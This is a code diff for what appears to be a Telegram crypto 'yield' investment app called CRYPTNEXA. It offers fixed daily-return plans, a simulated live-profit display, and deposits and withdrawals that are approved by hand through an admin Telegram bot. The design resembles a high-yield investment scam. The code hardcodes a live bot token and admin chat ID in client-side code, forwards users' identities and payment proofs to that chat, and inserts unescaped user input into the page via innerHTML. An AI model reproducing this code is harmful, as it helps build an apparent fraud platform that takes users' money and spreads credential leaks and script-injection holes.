+
+      let statusIconSvg = '';
+      let statusClass = 'pending';
+      let statusBadgeClass = 'pending';
+      let amountClass = 'positive';
+      let amountPrefix = '+';
+
+      if (tx.status === 'Completed') {
+        statusClass = 'success';
+        statusBadgeClass = 'completed';
+        statusIconSvg = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+      } else if (tx.status === 'Pending Review') {
+        statusClass = 'pending';
+        statusBadgeClass = 'pending';
+        statusIconSvg = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2" stroke-linecap="round"/></svg>`;
+      } else if (tx.status === 'Rejected') {
+        statusClass = 'failed';
+        statusBadgeClass = 'failed';
+        statusIconSvg = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M6 6l12 12M18 6L6 18" stroke-linecap="round"/></svg>`;
+      } else if (tx.status === 'Active') {
+        statusClass = 'pending';
+        statusBadgeClass = 'active';
+        statusIconSvg = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2" stroke-linecap="round"/></svg>`;
+      } else {
+        statusIconSvg = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+        statusClass = 'success';
+        statusBadgeClass = 'completed';
+      }
+
+      if (isWithdrawal) { amountClass = 'negative'; amountPrefix = '-'; }
+      else if (isInvestment) { amountClass = 'neutral'; amountPrefix = '-'; }
+      if (tx.status === 'Rejected' && isDeposit) { amountClass = 'negative'; amountPrefix = ''; }
+
+      let networkName = tx.network || 'USDT (TRC20)';
+      let rawAmount = tx.rawAmount || parseFloat((tx.amount || '0').replace(/[^0-9.]/g, '')) || 0;
+      const receiptDate = tx.fullDate || new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+      const fullAddress = tx.fullAddress || tx.ref || 'N/A';
+      const txIdDisplay = tx.fullId || tx.id.toUpperCase();
+
+      return `
+        <div class="pro-receipt">
+          <button class="pro-receipt-close" onclick="closeModal('receipt-modal')">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12" stroke-linecap="round"/></svg>
+          </button>
+          <div class="pro-receipt-header">
+            <div class="pro-receipt-status-icon ${statusClass}">${statusIconSvg}</div>
+            <div class="pro-receipt-amount ${amountClass}">${amountPrefix}$${rawAmount.toFixed(2)}</div>
+            <div class="pro-receipt-type-label">${isDeposit ? 'Deposit Amount' : isWithdrawal ? 'Withdrawal Amount' : 'Investment Amount'}</div>
+            <div class="pro-receipt-status-badge ${statusBadgeClass}">${tx.status === 'Pending Review' ? 'Pending Review' : tx.status}</div>
+          </div>
+          <div class="pro-receipt-body">
+            <div class="pro-receipt-row">
+              <span class="pro-receipt-row-label">Network</span>
+              <span class="pro-receipt-row-value" style="font-size:10px;">${networkName}</span>
+            </div>
+            <div class="pro-receipt-row">
+              <span class="pro-receipt-row-label">Date</span>
+              <span class="pro-receipt-row-value" style="font-size:10px;">${receiptDate}</span>
+            </div>
+            ${isWithdrawal ? `
+              <div class="pro-receipt-address-box">
+                <div class="pro-receipt-address-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M12 12h.01M8 12h.01M16 12h.01" stroke-linecap="round"/></svg>DESTINATION WALLET</div>
+                <div class="pro-receipt-address-value">${fullAddress}</div>
+              </div>
+            ` : isDeposit ? `
+              <div class="pro-receipt-txid-box">
+                <div class="pro-receipt-txid-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" stroke-linecap="round"/></svg>TRANSACTION ID</div>
+                <div class="pro-receipt-txid-value">${fullAddress}</div>
+              </div>
+            ` : `
+              <div class="pro-receipt-txid-box">
+                <div class="pro-receipt-txid-label"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" stroke-linecap="round"/></svg>REFERENCE ID</div>
+                <div class="pro-receipt-txid-value">${txIdDisplay}</div>
+              </div>
+            `}
+            <div class="pro-receipt-row">
+              <span class="pro-receipt-row-label">Status</span>
+              <span class="pro-receipt-row-value" style="color:${statusBadgeClass === 'completed' ? '#10b981' : statusBadgeClass === 'failed' ? '#ef4444' : statusBadgeClass === 'active' ? '#06b6d4' : '#f59e0b'}; text-transform:uppercase; font-size:10px;">${tx.status}</span>
+            </div>
+            <div class="pro-receipt-row">
+              <span class="pro-receipt-row-label">Reference</span>
+              <span class="pro-receipt-row-value" style="font-size:9px;">CRX-${Date.now().toString().slice(-8)}</span>
+            </div>
+          </div>
+          <div class="pro-receipt-footer">
+            <div class="pro-receipt-footer-text">CRYPTNEXA · SECURE RECEIPT</div>
+            <div class="pro-receipt-footer-brand">Institutional Crypto Yield</div>
+          </div>
+        </div>
+      `;
+    }
+
+    function openReceiptModal(txId) {
+      const tx = transactionsHistory.find(t => t.id === txId);
+      if (!tx) {
+        showModernAlert({ title: 'Not Found', message: 'Receipt not available', type: 'warning', icon: 'alert-circle' });
+        return;
+      }
+      document.getElementById('receipt-content-container').innerHTML = generateProReceiptHTML(tx);
+      document.getElementById('receipt-modal').classList.remove('hidden');
+      lucide.createIcons();
+      if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+    }
+
+    function renderHistory() {
+      const container = document.getElementById('history-container');
+      const countBadge = document.getElementById('history-count-badge');
+      container.innerHTML = '';
+      
+      if (countBadge) countBadge.innerText = `${transactionsHistory.length} ${transactionsHistory.length === 1 ? 'record' : 'records'}`;
+
+      if (transactionsHistory.length === 0) {
+        container.innerHTML = `
+          <div class="glass-card rounded-2xl p-6 text-center border border-brand-border">
+            <div class="w-14 h-14 rounded-2xl bg-emerald-500/10 flex items-center justify-center mx-auto mb-3">
+              <i data-lucide="receipt" class="w-7 h-7 text-emerald-400"></i>
+            </div>
+            <p class="text-sm font-bold text-white mb-1">No Transactions Yet</p>
+            <p class="text-[11px] text-gray-400 leading-relaxed">Your transaction history will appear here.</p>
+          </div>
+        `;
+        lucide.createIcons();
+        return;
+      }
+
+      transactionsHistory.forEach(tx => {
+        let iconEmoji = '₮';
+        let iconClass = 'deposit';
+        let amountClass = 'positive';
+        let amountPrefix = '+';
+
+        if (tx.type === 'withdraw') { iconEmoji = '↑'; iconClass = 'withdraw'; amountClass = 'negative'; amountPrefix = '-'; }
+        else if (tx.type === 'investment') { iconEmoji = '📈'; iconClass = 'investment'; amountClass = 'neutral'; amountPrefix = '-'; }
+
+        let statusClass = 'pending';
+        let statusText = 'Pending';
+        if (tx.status === 'Completed') { statusClass = 'completed'; statusText = 'Completed'; }
+        else if (tx.status === 'Rejected') { statusClass = 'failed'; statusText = 'Rejected'; }
+        else if (tx.status === 'Active') { statusClass = 'active'; statusText = 'Active'; }
+        else { statusClass = 'pending'; statusText = 'Pending Review'; }
+
+        let rawAmount = tx.rawAmount || parseFloat((tx.amount || '0').replace(/[^0-9.]/g, '')) || 0;
+        let networkDisplay = tx.network || 'USDT (TRC20)';
+
+        container.innerHTML += `
+          <div class="pro-history-card" onclick="openReceiptModal('${tx.id}')">
+            <div class="flex items-start gap-3">
+              <div class="pro-history-icon ${iconClass}">${iconEmoji}</div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-start justify-between gap-2">
+                  <div class="min-w-0">
+                    <h4 class="pro-history-title">${tx.title}</h4>
+                    <p class="pro-history-subtitle">${networkDisplay}</p>
+                  </div>
+                  <div class="text-right shrink-0">
+                    <div class="pro-history-amount ${amountClass}">${amountPrefix}$${rawAmount.toFixed(2)}</div>
+                    <span class="pro-history-status ${statusClass}">${statusText}</span>
+                  </div>
+                </div>
+                <div class="pro-history-meta">
+                  <div class="pro-history-meta-item">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2" stroke-linecap="round"/></svg>
+                    ${tx.time || 'Just now'}
+                  </div>
+                  <div class="flex items-center gap-2">
+                    <span class="pro-history-meta-item" style="color:#06b6d4;">${tx.id.slice(0, 8)}...</span>
+                    <span class="pro-history-view-btn">
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:11px;height:11px;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                      View
+                    </span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        `;
+      });
+      lucide.createIcons();
+    }
+
+    function renderActiveInvestments() {
+      const container = document.getElementById('active-investments-container');
+      if (!container) return;
+      if (activeInvestments.length === 0) {
+        container.innerHTML = `<div class="glass-card rounded-xl p-4 text-center text-xs text-gray-400 border border-brand-border">No active investments.</div>`;
+        return;
+      }
+      container.innerHTML = '';
+      activeInvestments.forEach(inv => {
+        const elapsed = Date.now() - inv.startTime;
+        const totalDuration = inv.endTime - inv.startTime;
+        const progress = Math.min((elapsed / totalDuration) * 100, 100);
+        const daysRemaining = Math.max(0, Math.ceil((inv.endTime - Date.now()) / (1000 * 60 * 60 * 24)));
+        const currentProfit = inv.currentProfit || 0;
+        const totalExpected = inv.rawAmount * (1 + (inv.rate * inv.days / 100));
+        
+        container.innerHTML += `
+          <div class="glass-card rounded-xl p-4 border-l-4 border-l-emerald-500 space-y-3">
+            <div class="flex justify-between items-start">
+              <div>
+                <h4 class="font-bold text-white text-sm">${inv.title}</h4>
+                <p class="text-xs text-gray-400 mt-0.5">Invested: <span class="text-white font-semibold">$${inv.rawAmount.toFixed(2)}</span></p>
+              </div>
+              <div class="text-right">
+                <span class="text-xs bg-emerald-500/10 text-emerald-400 font-bold px-2.5 py-1 rounded-full">Active</span>
+                <p class="text-[10px] text-cyan-400 mt-1 font-mono">${daysRemaining}d left</p>
+              </div>
+            </div>
+            <div class="bg-brand-bg rounded-lg p-2.5 space-y-1">
+              <div class="flex justify-between text-[11px]">
+                <span class="text-gray-400">Live Profit:</span>
+                <span class="text-emerald-400 font-black font-mono">+$${currentProfit.toFixed(4)}</span>
+              </div>
+              <div class="flex justify-between text-[11px]">
+                <span class="text-gray-400">Expected Total:</span>
+                <span class="text-cyan-400 font-bold font-mono">$${totalExpected.toFixed(2)}</span>
+              </div>
+            </div>
+            <div class="space-y-1">
+              <div class="flex justify-between text-xs text-gray-400">
+                <span>Progress</span>
+                <span class="font-mono">${progress.toFixed(1)}%</span>
+              </div>
+              <div class="w-full bg-gray-800 rounded-full h-2 overflow-hidden">
+                <div class="bg-gradient-to-r from-emerald-500 to-cyan-500 h-2 rounded-full" style="width: ${progress}%"></div>
+              </div>
+            </div>
+          </div>`;
+      });
+      lucide.createIcons();
+    }
+
+    function renderSupportTickets() {
+      const container = document.getElementById('support-tickets-history');
+      container.innerHTML = '';
+      if (supportTickets.length === 0) {
+        container.innerHTML = `<div class="glass-card rounded-xl p-3 text-center text-xs text-gray-400 border border-brand-border">No tickets yet.</div>`;
+        return;
+      }
+      supportTickets.forEach(ticket => {
+        container.innerHTML += `
+          <div class="glass-card rounded-xl p-4 border border-brand-border space-y-2.5" id="ticket-card-${ticket.id}">
+            <div class="flex items-center justify-between text-xs">
+              <span class="font-bold text-white">${ticket.id} • ${ticket.category}</span>
+              <span class="text-[10px] ${ticket.status === 'Resolved' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-amber-500/10 text-amber-400'} font-bold px-2 py-0.5 rounded">${ticket.status}</span>
+            </div>
+            <p class="text-xs text-gray-300 bg-brand-bg p-2.5 rounded-lg border border-brand-border">"${ticket.message}"</p>
+            ${ticket.reply ? `
+              <div class="p-2.5 bg-emerald-500/5 rounded-lg border border-emerald-500/20 text-[11px] space-y-1">
+                <div class="flex items-center gap-1.5 text-emerald-400 font-bold">
+                  <i data-lucide="bot" class="w-3.5 h-3.5"></i> Support Reply:
+                </div>
+                <p class="text-gray-200">${ticket.reply}</p>
+              </div>
+            ` : `<p class="text-[10px] text-cyan-400 italic">Awaiting reply...</p>`}
+          </div>`;
+      });
+      lucide.createIcons();
+    }
+
+    let currentPlan = {};
+    function openInvestModal(title, rate, days, min, max) {
+      if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+      currentPlan = { title, rate, days, min, max };
+      document.getElementById('modal-plan-title').innerText = title;
+      document.getElementById('modal-daily-rate').innerText = `${rate}%`;
+      document.getElementById('modal-limits-text').innerHTML = `Range: <strong class="text-white">$${min} - $${max.toLocaleString()}</strong>`;
+      document.getElementById('modal-amount-input').value = min;
+      calculateModalProfit();
+      document.getElementById('invest-modal').classList.remove('hidden');
+    }
+
+    function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
+
+    function calculateModalProfit() {
+      const amt = parseFloat(document.getElementById('modal-amount-input').value) || 0;
+      const dailyProfit = (amt * currentPlan.rate) / 100;
+      const netProfit = (amt * currentPlan.rate * currentPlan.days) / 100;
+      const totalPayout = amt + netProfit;
+      document.getElementById('modal-daily-profit').innerText = `$${dailyProfit.toFixed(2)}`;
+      document.getElementById('modal-net-profit').innerText = `$${netProfit.toFixed(2)}`;
+      document.getElementById('modal-total-payout').innerText = `$${totalPayout.toFixed(2)}`;
+    }
+
+    function confirmInvestment() {
+      const amt = parseFloat(document.getElementById('modal-amount-input').value);
+      if (isNaN(amt) || amt < currentPlan.min || amt > currentPlan.max) {
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        showModernAlert({ title: 'Invalid Amount', message: `Please enter an amount between $${currentPlan.min} and $${currentPlan.max.toLocaleString()}.`, type: 'warning', icon: 'alert-circle' });
+        return;
+      }
+      if (amt > userPortfolio.balance) {
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        showModernAlert({ title: 'Insufficient Balance', message: `Your available balance is $${userPortfolio.balance.toFixed(2)}.`, type: 'error', icon: 'wallet' });
+        return;
+      }
+
+      const now = Date.now();
+      const endTime = now + (currentPlan.days * 24 * 60 * 60 * 1000);
+      userPortfolio.balance -= amt;
+      userPortfolio.lockedBalance += amt;
+      updateWalletUI();
+
+      activeInvestments.unshift({ title: currentPlan.title, rawAmount: amt, rate: currentPlan.rate, days: currentPlan.days, startTime: now, endTime: endTime, currentProfit: 0, progress: 0 });
+      saveAppData();
+      renderActiveInvestments();
+
+      const nowStr = new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+      const invId = 'inv_' + Date.now();
+      const newTx = { id: invId, type: 'investment', title: currentPlan.title, network: `${currentPlan.days}-Day Lock`, ref: 'Plan Allocation', rawAmount: amt, amount: `-$${amt.toFixed(2)}`, status: 'Active', color: 'cyan', icon: 'zap', time: nowStr, fullDate: nowStr, fullId: invId.toUpperCase() };
+      transactionsHistory.unshift(newTx);
+      saveAppData();
+      renderHistory();
+      closeModal('invest-modal');
+
+      triggerAdminBotNotification(`🚀 *NEW INVESTMENT*\n\n👤 User: \`${currentUserProfile.id}\`\n💰 Amount: *-$${amt.toFixed(2)}*\n📦 Plan: *${currentPlan.title}*`);
+      showModernAlert({ title: 'Investment Started!', message: `$${amt.toFixed(2)} has been deployed into ${currentPlan.title}.`, type: 'success', icon: 'check-circle', btnText: 'View Dashboard' });
+    }
+
+    async function initiateDepositProcess() {
+      const depAmtInput = document.getElementById('deposit-amount-input');
+      const hashInput = document.getElementById('tx-hash-input');
+      const depAmt = parseFloat(depAmtInput.value);
+      const hash = hashInput.value.trim();
+
+      if (isNaN(depAmt) || depAmt < 5) {
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        showModernAlert({ title: 'Invalid Amount', message: 'The minimum deposit amount is $5.00.', type: 'warning', icon: 'alert-circle' });
+        return;
+      }
+      if ((!hash || hash.length < 5) && !uploadedScreenshotData) {
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        showModernAlert({ title: 'Proof Required', message: 'Please provide either a Transaction ID (TxID) or upload a screenshot.', type: 'warning', icon: 'image' });
+        return;
+      }
+
+      const networkName = cryptoWallets[selectedDepositNetworkKey].name;
+      const networkAddress = cryptoWallets[selectedDepositNetworkKey].address;
+      
+      let actualProof = hash && hash.length >= 5 ? hash : uploadedScreenshotData;
+
+      depAmtInput.value = '';
+      hashInput.value = '';
+      const fileDisplayName = uploadedScreenshotData;
+      const fileBase64 = uploadedScreenshotBase64;
+      uploadedScreenshotData = null;
+      uploadedScreenshotBase64 = null;
+      document.getElementById('upload-placeholder-content').classList.remove('hidden');
+      document.getElementById('upload-preview-container').classList.add('hidden');
+      backToWalletOverview();
+
+      const txId = 'tx_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
+      const nowStr = new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+      
+      const txObj = {
+        id: txId, type: 'deposit', title: 'Crypto Deposit', network: networkName,
+        ref: hash ? 'TxID: ' + hash.substring(0, 8) + '...' : 'Screenshot: ' + fileDisplayName, 
+        rawAmount: depAmt, amount: `+$${depAmt.toFixed(2)}`,
+        status: 'Pending Review', color: 'emerald', icon: 'arrow-down-left',
+        time: nowStr, fullDate: nowStr, fullId: 'DEP-' + txId.toUpperCase().slice(-12),
+        fullAddress: actualProof, processed: false,
+        txHashFull: hash || null,
+        screenshotBase64: fileBase64 || null,
+        screenshotName: fileDisplayName || null,
+        userFullName: currentUserProfile.name,
+        userUsername: currentUserProfile.username,
+        userTelegramId: currentUserProfile.id,
+        depositAddress: networkAddress
+      };
+
+      transactionsHistory.unshift(txObj);
+      saveAppData();
+      renderHistory();
+
+      await sendDepositToAdminBot(txObj);
+      startSimpleProcessing(`+$${depAmt.toFixed(2)}`, txId, false);
+    }
+
+    async function sendDepositToAdminBot(tx) {
+      const BOT_TOKEN = "9047928965:AAFwgZzenhoygduvmfxCx-FTpoqpq0c2IF8";
+      const ADMIN_CHAT_ID = "7076265514";
+
+      const uniqueTag = `#DEP${Date.now().toString().slice(-6)}`;
+
+      let caption = `🚨 *NEW DEPOSIT REQUEST* ${uniqueTag}\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      caption += `👤 *Name:* ${tx.userFullName}\n`;
+      caption += `🔗 *Username:* ${tx.userUsername}\n`;
+      caption += `🆔 *Telegram ID:* \`${tx.userTelegramId}\`\n`;
+      caption += `📌 *TX Reference:* \`${tx.id}\`\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      caption += `💰 *Amount:* +$${tx.rawAmount.toFixed(2)} USDT\n`;
+      caption += `🌐 *Network:* ${tx.network}\n`;
+      caption += `📥 *Deposit Address:*\n\`${tx.depositAddress}\`\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+
+      if (tx.txHashFull) {
+        caption += `🔍 *Transaction ID (TxID):*\n\`${tx.txHashFull}\`\n`;
+        caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      }
+
+      caption += `⏰ *Date:* ${tx.fullDate}\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      caption += `✅ *Process this request:*`;
+
+      const keyboard = {
+        inline_keyboard: [[
+          { text: `✅ VERIFY ${uniqueTag}`, callback_data: `approve_${tx.id}` },
+          { text: `❌ DECLINE ${uniqueTag}`, callback_data: `reject_${tx.id}` }
+        ]]
+      };
+
+      if (tx.screenshotBase64) {
+        try {
+          const base64Data = tx.screenshotBase64.split(',')[1];
+          const byteCharacters = atob(base64Data);
+          const byteNumbers = new Array(byteCharacters.length);
+          for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+          }
+          const byteArray = new Uint8Array(byteNumbers);
+          const blob = new Blob([byteArray], { type: 'image/jpeg' });
+          
+          const formData = new FormData();
+          formData.append('chat_id', ADMIN_CHAT_ID);
+          formData.append('photo', blob, tx.screenshotName || 'screenshot.jpg');
+          formData.append('caption', caption);
+          formData.append('parse_mode', 'Markdown');
+          formData.append('reply_markup', JSON.stringify(keyboard));
+          
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        } catch (err) {
+          console.log('Photo send error:', err);
+          await sendTextToAdmin(BOT_TOKEN, ADMIN_CHAT_ID, caption, keyboard);
+        }
+      } else {
+        await sendTextToAdmin(BOT_TOKEN, ADMIN_CHAT_ID, caption, keyboard);
+      }
+    }
+
+    async function sendTextToAdmin(BOT_TOKEN, ADMIN_CHAT_ID, caption, keyboard) {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: caption, parse_mode: "Markdown", reply_markup: keyboard })
+        });
+      } catch (err) { console.log('Send error:', err); }
+    }
+
+    async function initiateWithdrawalProcess() {
+      const amt = parseFloat(document.getElementById('withdraw-amount').value);
+      const addr = document.getElementById('withdraw-address').value.trim();
+
+      if (!amt || amt < 5) {
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        showModernAlert({ title: 'Minimum Withdrawal', message: 'The minimum withdrawal amount is $5.00.', type: 'warning', icon: 'alert-circle' });
+        return;
+      }
+      if (amt > userPortfolio.balance) {
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        showModernAlert({ title: 'Insufficient Balance', message: `Your available balance is $${userPortfolio.balance.toFixed(2)}.`, type: 'error', icon: 'wallet' });
+        return;
+      }
+      if (!addr || addr.length < 10) {
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+        showModernAlert({ title: 'Invalid Address', message: 'Please provide a valid wallet address.', type: 'warning', icon: 'wallet' });
+        return;
+      }
+
+      userPortfolio.balance -= amt;
+      updateWalletUI();
+      saveAppData();
+
+      const netNames = { usdt_trc20: 'USDT (TRC20)', usdt_bep20: 'USDT (BEP20)', usdt_erc20: 'USDT (ERC20)', ton: 'TON' };
+      const netName = netNames[selectedWithdrawNetworkKey];
+      const shortAddr = addr.length > 20 ? addr.substring(0, 6) + '...' + addr.substring(addr.length - 4) : addr;
+
+      document.getElementById('withdraw-amount').value = '';
+      document.getElementById('withdraw-address').value = '';
+      backToWalletOverview();
+
+      const txId = 'tx_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
+      const nowStr = new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+      
+      const txObj = {
+        id: txId, type: 'withdraw', title: 'Crypto Withdrawal', network: netName,
+        ref: 'To: ' + shortAddr, rawAmount: amt, amount: `-$${amt.toFixed(2)}`,
+        status: 'Pending Review', color: 'cyan', icon: 'arrow-up-right',
+        time: nowStr, fullDate: nowStr, fullId: 'WDR-' + txId.toUpperCase().slice(-12),
+        fullAddress: addr, processed: false,
+        userFullName: currentUserProfile.name,
+        userUsername: currentUserProfile.username,
+        userTelegramId: currentUserProfile.id
+      };
+
+      transactionsHistory.unshift(txObj);
+      saveAppData();
+      renderHistory();
+
+      await sendWithdrawalToAdminBot(txObj);
+      startSimpleProcessing(`-$${amt.toFixed(2)}`, txId, true);
+    }
+
+    async function sendWithdrawalToAdminBot(tx) {
+      const BOT_TOKEN = "9047928965:AAFwgZzenhoygduvmfxCx-FTpoqpq0c2IF8";
+      const ADMIN_CHAT_ID = "7076265514";
+
+      const uniqueTag = `#WDR${Date.now().toString().slice(-6)}`;
+
+      let caption = `🚨 *NEW WITHDRAWAL REQUEST* ${uniqueTag}\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      caption += `👤 *Name:* ${tx.userFullName}\n`;
+      caption += `🔗 *Username:* ${tx.userUsername}\n`;
+      caption += `🆔 *Telegram ID:* \`${tx.userTelegramId}\`\n`;
+      caption += `📌 *TX Reference:* \`${tx.id}\`\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      caption += `💰 *Amount:* -$${tx.rawAmount.toFixed(2)} USDT\n`;
+      caption += `🌐 *Network:* ${tx.network}\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      caption += `📤 *Destination Address:*\n\`${tx.fullAddress}\`\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      caption += `⏰ *Date:* ${tx.fullDate}\n`;
+      caption += `━━━━━━━━━━━━━━━━━━━━\n`;
+      caption += `✅ *Process this request:*`;
+
+      const keyboard = {
+        inline_keyboard: [[
+          { text: `✅ VERIFY ${uniqueTag}`, callback_data: `approve_${tx.id}` },
+          { text: `❌ DECLINE ${uniqueTag}`, callback_data: `reject_${tx.id}` }
+        ]]
+      };
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: caption, parse_mode: "Markdown", reply_markup: keyboard })
+        });
+      } catch (err) { console.log('Send error:', err); }
+    }
+
+    function triggerAdminBotNotification(textMessage) {
+      const BOT_TOKEN = "9047928965:AAFwgZzenhoygduvmfxCx-FTpoqpq0c2IF8";
+      const ADMIN_CHAT_ID = "7076265514";
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: textMessage, parse_mode: "Markdown" })
+      }).catch(err => console.log('Telegram dispatch:', err));
+    }
+
+    async function sendUserBotNotification(userTgId, textMessage) {
+      const BOT_TOKEN = "9047928965:AAFwgZzenhoygduvmfxCx-FTpoqpq0c2IF8";
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: userTgId, text: textMessage, parse_mode: "Markdown" })
+        });
+      } catch (err) { console.log('User notification error:', err); }
+    }
+
+    function simulateSystemResponse(txId, action) {
+      const targetTx = transactionsHistory.find(t => t.id === txId);
+      if (!targetTx) {
+        showModernAlert({ title: 'Not Found', message: 'Transaction not found.', type: 'error', icon: 'alert-circle' });
+        return;
+      }
+      if (targetTx.processed || targetTx.status !== 'Pending Review') {
+        showModernAlert({ title: 'Already Processed', message: 'This transaction has already been reviewed.', type: 'info', icon: 'shield-check' });
+        return;
+      }
+
+      targetTx.processed = true;
+      targetTx.processedAt = new Date().toISOString();
+
+      const txAmount = targetTx.rawAmount || 0;
+      const txTypeLabel = targetTx.type === 'deposit' ? 'Deposit' : 'Withdrawal';
+      const userTgId = targetTx.userTelegramId;
+
+      if (action === 'approve') {
+        targetTx.status = 'Completed';
+        if (targetTx.type === 'deposit') {
+          userPortfolio.balance += txAmount;
+          userPortfolio.totalDeposited += txAmount;
+        } else if (targetTx.type === 'withdraw') {
+          userPortfolio.totalWithdrawn += txAmount;
+        }
+        updateWalletUI();
+        triggerAdminBotNotification(`✅ *VERIFIED*\n\nUser: \`${userTgId}\`\nAmount: *${targetTx.amount}*`);
+
+        if (userTgId) {
+          const shortMsg = 
+`✅ *Your ${txTypeLabel.toLowerCase()} has been completed successfully.*
+💰 $${txAmount.toFixed(2)} USDT · ${targetTx.network}`;
+          sendUserBotNotification(userTgId, shortMsg);
+        }
+
+        showModernAlert({ 
+          title: 'Transaction Completed', 
+          message: `${txTypeLabel} of $${txAmount.toFixed(2)} has been successfully completed. User has been notified.`, 
+          type: 'success', 
+          icon: 'check-circle' 
+        });
+      } else {
+        targetTx.status = 'Rejected';
+        if (targetTx.type === 'withdraw') {
+          userPortfolio.balance += txAmount;
+          updateWalletUI();
+        }
+        triggerAdminBotNotification(`❌ *DECLINED*\n\nUser: \`${userTgId}\`\nAmount: *${targetTx.amount}*`);
+
+        if (userTgId) {
+          const shortMsg = 
+`❌ *Your ${txTypeLabel.toLowerCase()} request has been declined.*
+💰 $${txAmount.toFixed(2)} USDT · Contact support for details`;
+          sendUserBotNotification(userTgId, shortMsg);
+        }
+
+        showModernAlert({ 
+          title: 'Transaction Declined', 
+          message: `${txTypeLabel} of $${txAmount.toFixed(2)} has been declined. User has been notified.`, 
+          type: 'error', 
+          icon: 'x-circle' 
+        });
+      }
+
+      saveAppData();
+      renderHistory();
+      if (!document.getElementById('receipt-modal').classList.contains('hidden')) {
+        openReceiptModal(txId);
+      }
+    }
+
+    function hideAdminNotify() { document.getElementById('admin-notify-popup').classList.remove('show-popup'); }
+    function scrollToTicketForm() { document.getElementById('support-ticket-box').scrollIntoView({ behavior: 'smooth' }); }
+
+    function submitSupportTicket() {
+      const category = document.getElementById('support-category').value;
+      const message = document.getElementById('support-message').value.trim();
+
+      if (!message || message.length < 5) {
+        showModernAlert({ title: 'Message Too Short', message: 'Please provide a detailed description (at least 5 characters).', type: 'warning', icon: 'alert-circle' });
+        return;
+      }
+
+      const nowStr = new Date().toLocaleString('en-US', { month: 'short', day: 'numeric' });
+      const ticketId = 'tkt_' + Math.floor(1000 + Math.random() * 9000);
+      const ticketBadge = '#84' + Math.floor(10 + Math.random() * 90);
+      
+      supportTickets.unshift({ id: ticketBadge, rawId: ticketId, category, message, date: nowStr, status: 'Pending', reply: null });
